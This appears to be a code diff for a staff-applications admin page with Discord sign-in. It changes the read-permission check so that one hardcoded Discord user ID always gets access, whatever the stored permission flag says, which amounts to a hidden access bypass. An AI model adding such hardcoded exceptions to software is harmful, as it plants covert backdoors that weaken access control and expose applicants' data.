@@ -19,7 +19,9 @@ export default async function StaffApplicationsAdminPage() {
     redirect("/api/auth/signin/discord?callbackUrl=/applications/staff");
   }
 
-  let canRead = Boolean(u.canReadStaffApps);
+  let canRead =
+  Boolean(u.canReadStaffApps) ||
+  u.discordId === "1473374169126146170";
   let allowedTypes: StaffApplicationType[] | null =
     (u.staffAppTypes as StaffApplicationType[] | null) ?? null;
 
